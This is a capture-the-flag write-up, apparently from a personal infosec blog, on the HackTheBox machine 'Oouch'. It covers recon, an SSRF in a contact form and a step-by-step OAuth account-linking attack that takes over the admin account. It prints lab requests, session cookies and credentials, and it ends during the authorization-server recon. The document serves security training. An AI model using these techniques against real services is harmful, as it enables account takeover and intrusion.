<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Oouch just retired on Hackthebox, it’s a hard difficulty Linux box. As of today it’s amongst the box that have the highest user rated difficulty with a score of 8.2&#x2F;10.While being very well desinged">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Oouch">
<meta property="og:url" content="https://hg8.sh/posts/oouch/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="Oouch just retired on Hackthebox, it’s a hard difficulty Linux box. As of today it’s amongst the box that have the highest user rated difficulty with a score of 8.2&#x2F;10.While being very well desinged">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82158507-a639c700-9888-11ea-83d0-9e50890dd8a9.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81942934-0ddae280-95fb-11ea-940a-4c4e329b61f6.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81943091-3c58bd80-95fb-11ea-9e2f-867eb8a4c1c5.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81944066-7aa2ac80-95fc-11ea-835a-fdf04adf06f0.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81945236-1ed92300-95fe-11ea-856f-4042b2140d1a.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81948139-b2602300-9601-11ea-9fb6-c8f7a8a2d7d6.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81963269-29eb7d80-9615-11ea-948f-bb4d2a675fad.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81965033-c3b42a00-9617-11ea-9cf5-bab6e38cc94c.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81966166-6325ec80-9619-11ea-802d-7b75cb074c7f.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82031132-b17ad000-9699-11ea-8e63-7ba9817d8acf.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82032114-1551c880-969b-11ea-9e59-14f768fffc6e.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82034596-af674000-969e-11ea-971f-a42af9e045bf.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82034990-3caa9480-969f-11ea-961b-f05aed50754a.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82035623-0b7e9400-96a0-11ea-9e54-510ef5886477.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82037282-32d66080-96a2-11ea-87b9-30b6b9549cb7.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82037690-c7d95980-96a2-11ea-97ec-cc029da2757c.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82041031-ccecd780-96a7-11ea-9339-392370b65e09.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82041094-e55cf200-96a7-11ea-8286-2b603d06eb82.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82045193-f9582200-96ae-11ea-9c83-a9184efcba4a.png">
<meta property="article:published_time" content="2020-07-31T22:00:00.000Z">
<meta property="article:modified_time" content="2022-02-28T13:09:08.638Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="docker">
<meta property="article:tag" content="Oouch">
<meta property="article:tag" content="oauth">
<meta property="article:tag" content="oauth2">
<meta property="article:tag" content="SSRF">
<meta property="article:tag" content="uwsgi">
<meta property="article:tag" content="exploit">
<meta property="article:tag" content="dbus">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82158507-a639c700-9888-11ea-83d0-9e50890dd8a9.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
     
    <title>HackTheBox - Oouch :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
<link rel="stylesheet" href="/css/style.css">

    
    
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/traceback/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/book/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-anonymous-user"><span class="toc-number">1.2.</span> <span class="toc-text">FTP anonymous user</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oouch-main-application-port-5000"><span class="toc-number">1.3.</span> <span class="toc-text">Oouch main application (port 5000)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Contact-Page-SSRF"><span class="toc-number">1.4.</span> <span class="toc-text">Contact Page SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oauth-Flow"><span class="toc-number">1.5.</span> <span class="toc-text">Oauth Flow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attacking-the-OAuth-%E2%80%9CConnect%E2%80%9D-request"><span class="toc-number">1.6.</span> <span class="toc-text">Attacking the OAuth “Connect” request</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QTC-Documents"><span class="toc-number">1.7.</span> <span class="toc-text">QTC Documents</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Connecting-to-Authorization-server-as-QTC"><span class="toc-number">1.8.</span> <span class="toc-text">Connecting to Authorization server as QTC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API-get-user-endpoint"><span class="toc-number">1.9.</span> <span class="toc-text">API get_user endpoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Retrieving-qtc-SSH-key-through-API"><span class="toc-number">1.10.</span> <span class="toc-text">Retrieving qtc SSH key through API</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-Docker-Container"><span class="toc-number">2.2.</span> <span class="toc-text">Accessing Docker Container</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DBus-htb-oouch-Block-Interface"><span class="toc-number">2.3.</span> <span class="toc-text">DBus htb.oouch.Block Interface</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-qtc-gt-docker-www-data"><span class="toc-number">2.4.</span> <span class="toc-text">Pivot qtc -&gt; docker www-data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DBus-privilege-escalation"><span class="toc-number">2.5.</span> <span class="toc-text">DBus privilege escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Method-1-SSH-authorized-keys"><span class="toc-number">2.5.1.</span> <span class="toc-text">Method 1: SSH authorized_keys</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Method-2-Bi-directional-netcat"><span class="toc-number">2.5.2.</span> <span class="toc-text">Method 2: Bi-directional netcat</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Beyond-root"><span class="toc-number">3.</span> <span class="toc-text">Beyond root</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Oouch
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2020-07-31T22:00:00.000Z" itemprop="datePublished">01-08-2020</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      26 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <img width="574" alt="oouch-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158507-a639c700-9888-11ea-83d0-9e50890dd8a9.png">

<p>Oouch just retired on Hackthebox, it’s a hard difficulty Linux box. As of today it’s amongst the box that have the highest user rated difficulty with a score of 8.2/10.<br>While being very well desinged, this box unsurprisingly gave me a very hard time but it’s also the box that made me learn the most since I started HackTheBox. While it can be very tedious to progress at first, it quickly makes a lot of sense and become very rewarding once you know what you are looking for and trying to exploit. As much as ever this box reminds the importance of looking at the big picture. Puts things into perspective in order to understand the logic behind an application makes its exploitation more straightforward.<br>The truth is I got stuck a little on it so special thanks to my buddy <em>El_B@rt0</em> for the help along the torturous road.<br>Alright enough with the talk and place to the writeup!</p>
<p><strong>Tl;Dr:</strong> In order to retrieve the user flag you had to chain multiple OAuth 2.0 protocol flaws with a SSRF vulnerability in order to “steal” admin account access. In a first part you use the SSRF vulnerability to access admin documents containing credentials to access the OAuth authorization server. From there we could create our own application and craft an authorization link redirecting to our server. Using the SSRF this link can be used to steal the admin session cookie. With the admin cookie, it’s possible to generate a API access token. With this token we can request the API which contains an endpoint used to retrieve connected user SSH key. The SSH key is then used to connect as <code>qtc</code> and grab the flag.<br>To retrieve the root flag you had first to pivot from <code>qtc</code> user in a docker container to <code>www-data</code> using a Remote Code Execution exploit on the web-server running. As <code>www-data</code> is was possible to exploit a custom <code>DBus</code> server used by the app in order to let the docker container communicate with the host. You would craft and send a malicious message to the interface used by the app and achieve Remote Code Execution as <code>root</code> through the privileged <code>Dbus</code> server. </p>
<p>Alright! Let’s get into the details now!</p>
<hr>
<p>First thing first, let’s add the box IP to the hosts file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.177 oouch.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>and let’s start!</p>
<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sC -T4 -p- oouch.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> oouch.htb (10.10.10.177)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">5000/tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">| http-title: Welcome to Oouch</span><br><span class="line">|_Requested resource was http://oouch.htb:5000/login?next=%2F</span><br><span class="line">8000/tcp open  rtsp</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 1017.45 seconds</span></span><br></pre></td></tr></table></figure>

<p>We have two high port open on <code>5000</code> and <code>8000</code> open. <code>5000</code> seems to be the main app web server. </p>
<p>Port 22 SSH is open as usual aswell with port 21 FTP which allows <code>anonymous</code> login. We will start with that.</p>
<h3 id="FTP-anonymous-user"><a href="#FTP-anonymous-user" class="headerlink" title="FTP anonymous user"></a>FTP anonymous user</h3><p>Let’s start by checking if we can retrieve any files from the FTP server. We indeed find a <code>project.txt</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ftp oouch.htb</span><br><span class="line">Connected to oouch.htb.</span><br><span class="line">220 qtc<span class="string">&#x27;s development server</span></span><br><span class="line"><span class="string">Name (oouch.htb:hg8): anonymous</span></span><br><span class="line"><span class="string">230 Login successful.</span></span><br><span class="line"><span class="string">Remote system type is UNIX.</span></span><br><span class="line"><span class="string">ftp&gt; ls</span></span><br><span class="line"><span class="string">-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt</span></span><br><span class="line"><span class="string">ftp&gt; get project.txt</span></span><br><span class="line"><span class="string">226 Transfer complete.</span></span><br><span class="line"><span class="string">ftp&gt; quit</span></span><br><span class="line"><span class="string">221 Goodbye.</span></span><br></pre></td></tr></table></figure>

<p>Let’s see what we got inside:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat project.txt</span><br><span class="line">Flask -&gt; Consumer</span><br><span class="line">Django -&gt; Authorization Server</span><br></pre></td></tr></table></figure>

<p>Alright so that’s not a lot of informations… Given the name of the box we are probably going to have an OAuth server. The consumer app is written using Flask Python Framework and Django is used for the Authorization Server. Let’s keep that in mind. Maybe later we can find exploits for those.</p>
<h3 id="Oouch-main-application-port-5000"><a href="#Oouch-main-application-port-5000" class="headerlink" title="Oouch main application (port 5000)"></a>Oouch main application (port 5000)</h3><p>Opening <code>http://oouch.htb:5000</code> display the following website:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/81942934-0ddae280-95fb-11ea-940a-4c4e329b61f6.png" alt="oouch port 5000"></p>
<p>Since we can register let’s create a new account. Once logged-in we arrive on the following page:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/81943091-3c58bd80-95fb-11ea-9e2f-867eb8a4c1c5.png" alt="oouch 5000 login"></p>
<p>We can access a few new pages from there. The most useful one seems to be:</p>
<ul>
<li>Profile: display informations about the connected account. Informs us it’s possible to links accounts.</li>
<li>Documents: display administrative documents stored for the connected account.</li>
<li>Contact: Allows to forward messages to the system administrator. </li>
</ul>
<p>The About page confirm our theory about Django:</p>
<blockquote>
<p>This application is the pilot project for our Oouch authorization server.</p>
</blockquote>
<p>Let’s continue our recon.</p>
<h3 id="Contact-Page-SSRF"><a href="#Contact-Page-SSRF" class="headerlink" title="Contact Page SSRF"></a>Contact Page SSRF</h3><p>The choice of words in contact page catch my attention:</p>
<blockquote>
<p>Messages that were submitted in the message box below are forwarded to the system administrator. </p>
</blockquote>
<p>Out of curiosity I sent various payload to the message box and quick noticed it’s vulnerable to SSRF:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/81944066-7aa2ac80-95fc-11ea-835a-fdf04adf06f0.png" alt="oouch contact ssrf"></p>
<p>On our web server we see a new request coming from <code>10.10.10.177</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.10.177 - - [14/May/2020 16:03:19] <span class="string">&quot;GET /ssrf HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure>

<p>But so far we have no way to exploit it properly, let’s just keep it in mind for later.</p>
<h3 id="Oauth-Flow"><a href="#Oauth-Flow" class="headerlink" title="Oauth Flow"></a>Oauth Flow</h3><p>Let’s continue our recon by running <code>gobuster</code> to see if other files/endpoints are accessible:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://oouch.htb:5000&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/about (Status: 302)</span><br><span class="line">/contact (Status: 302)</span><br><span class="line">/documents (Status: 302)</span><br><span class="line">/home (Status: 302)</span><br><span class="line">/login (Status: 200)</span><br><span class="line">/<span class="built_in">logout</span> (Status: 302)</span><br><span class="line">/oauth (Status: 302)</span><br><span class="line">/profile (Status: 302)</span><br><span class="line">/register (Status: 200)</span><br></pre></td></tr></table></figure>

<p>This <code>/oauth</code> endpoint is new. Navigating to it gives us access to more informations:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/81945236-1ed92300-95fe-11ea-856f-4042b2140d1a.png" alt="oouch oauth endpoint"></p>
<p>First we need to add this new <code>consumer.oouch.htb</code> subdomain to our host file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.177 consumer.oouch.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>Opening <code>http://consumer.oouch.htb</code> displays almost the exact same login page. When opening the page, a new subdomain is requested:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=<span class="built_in">read</span> HTTP/1.1</span><br><span class="line">Host: authorization.oouch.htb:8000</span><br></pre></td></tr></table></figure>

<p>Again, let’s add it to our host file and take a look at it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.177 authorization.oouch.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>Opening <code>http://authorization.oouch.htb</code> displays the following website:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/81948139-b2602300-9601-11ea-9fb6-c8f7a8a2d7d6.png" alt="oouch authorization"></p>
<p>From here it seems possible to create account and login. If you are not familiar with OAuth Authorization servers I recommend you this great <a target="_blank" rel="noopener" href="https://medium.com/google-cloud/understanding-oauth2-and-building-a-basic-authorization-server-of-your-own-a-beginners-guide-cf7451a16f66">introduction to the topic</a>. </p>
<p>Let’s create register a new client called <code>hg8_auth</code>:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/81963269-29eb7d80-9615-11ea-948f-bb4d2a675fad.png" alt="Oouch new authorization"></p>
<p>Ok the next step is to connect our account with the Oouch authorization server. But that’s where the SSRF we found earlier will come useful. Instead of linking our own account, we are going to link the admin account using SSRF. This way we will get the authorization code and token to access the admin account.</p>
<h3 id="Attacking-the-OAuth-“Connect”-request"><a href="#Attacking-the-OAuth-“Connect”-request" class="headerlink" title="Attacking the OAuth “Connect” request"></a>Attacking the OAuth “Connect” request</h3><p>After searching for informations on this topic I stumbled upon this article “<a target="_blank" rel="noopener" href="https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/">Attacking the OAuth Protocol</a>“ explaining how it was possible to abuse OAuth “Connect” request to gain access to the victim’s account on the Client by connecting one of our own account. Let’s try this trick.</p>
<p>Using Burp proxy with intercept on will come useful here, opening the <code>http://consumer.oouch.htb:5000/oauth/connect</code> page should display this form:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/81965033-c3b42a00-9617-11ea-9cf5-bab6e38cc94c.png" alt="oouch auth authorization form"></p>
<p>With Burp intercept we can forward requests until we get the following one:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/oauth/connect/token?code=TFKMAn9chP5VPBGMBcwR3QhcSeGSxn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>consumer.oouch.htb:5000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=.eJwlT8tqAzEM_BXjcyiS_M5X9F5CkG05uzTNlvXmFPLvFfQ0jObB6GWv485zkWnPXy9rDgX7I3PyTezJft6Fp5j7djPrwxyb4dZUNMeyTvOrng97eV9OWrLLXOz52J-ibO32bAVHqJipsxvkAXokSFLIN_AwImUcPfuchXtLPQOCT4QNODZMeqtC1bkEkrjK8JodGat4F3LpwxfgAalQHAHIOwUfsiNyqFR4JJ3f5j6ux_YtD91DHWNz6IGll1oqEPqCIEwQe6AWGFuKNWjuOWX_f4Ls-w9j5VTN.Xr2cMw.O5uipwhI9L-auXFpngItBkAl2wc; remember_token=2|72dbe72f819249d55773f59f1e586cb642ea234a7f89458e71b123bbab32bfd12213cf79d6cfc4670f031a60a5da64c239362d3e976d5c7c606a80a341fbbfaf</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>

<p>Let’s note down the token, <strong>drop</strong> the request, and go back to the Contact page. </p>
<p>On the contact page let’s send the full link to our connection token (<code>http://consumer.oouch.htb:5000/oauth/connect/token?code=7giFB9MMVgAJJHiIxaiX8IkCDXi5DV</code>)  for it to be open by the admin:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/81966166-6325ec80-9619-11ea-802d-7b75cb074c7f.png" alt="oouch ssrf auth token"></p>
<p>Now when the admin will open the link, he will link his account to ours. Then as described in the <code>/oauth</code> page:</p>
<blockquote>
<p>Once your account is connected, you should be able to use the authorization server for login. </p>
</blockquote>
<p>Let’s head at <code>http://consumer.oouch.htb:5000/oauth/login</code>, select <code>Authorize</code> and bingo! We should now be connected as <code>qtc</code>:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/82031132-b17ad000-9699-11ea-8e63-7ba9817d8acf.png" alt="oouch qtc connect"></p>
<p><em>Note: You have to be careful since on the <code>/oauth</code> page, the <code>login</code> link actually redirect to <code>connect</code> page. It’s an easy to overlook mistake since both <code>Authorize</code> button looks the same (lost too much on this one to be honest…):</em></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://consumer.oouch.htb:5000/oauth/connect&quot;</span>&gt;</span></span><br><span class="line">  http://consumer.oouch.htb:5000/oauth/login</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="QTC-Documents"><a href="#QTC-Documents" class="headerlink" title="QTC Documents"></a>QTC Documents</h3><p>Browsing back to <code>http://consumer.oouch.htb:5000/documents</code> with <code>qtc</code> account we access a few interesting documents:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/82032114-1551c880-969b-11ea-9e59-14f768fffc6e.png" alt="oouch qtc documents"></p>
<p><code>todo.txt</code> looks espacially promising… Looks like there is a way to retrieve <code>qtc</code> SSH key. </p>
<h3 id="Connecting-to-Authorization-server-as-QTC"><a href="#Connecting-to-Authorization-server-as-QTC" class="headerlink" title="Connecting to Authorization server as QTC"></a>Connecting to Authorization server as QTC</h3><p>Now we need to find a way to connect to the <code>Authorization</code> server as <code>qtc</code> too. Let’s run <code>gobuster</code> to see if we missed some endpoints on this server:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://authorization.oouch.htb:8000&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/home (Status: 301)</span><br><span class="line">/login (Status: 301)</span><br><span class="line">/signup (Status: 301)</span><br><span class="line">/oauth (Status: 301)</span><br></pre></td></tr></table></figure>

<p>Let’s do a new search for this <code>/oauth</code> endpoint:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://authorization.oouch.htb:8000/oauth&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/applications (Status: 301)</span><br><span class="line">/authorize (Status: 301)</span><br><span class="line">/token (Status: 301)</span><br></pre></td></tr></table></figure>

<p><code>/applications</code> looks promising… Let’s check what’s there:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/82034596-af674000-969e-11ea-971f-a42af9e045bf.png" alt="oouch oauth applications endpoint"></p>
<p>Unfortunately we get prompted a Basic Auth. Trying the credentials found in <code>qtc</code> notes <code>develop</code>:<code>supermegasecureklarabubu123!</code> doesn’t work.</p>
<p>Looking back at the notes we see:</p>
<blockquote>
<p>develop:supermegasecureklarabubu123! -&gt; Allows application registration.</p>
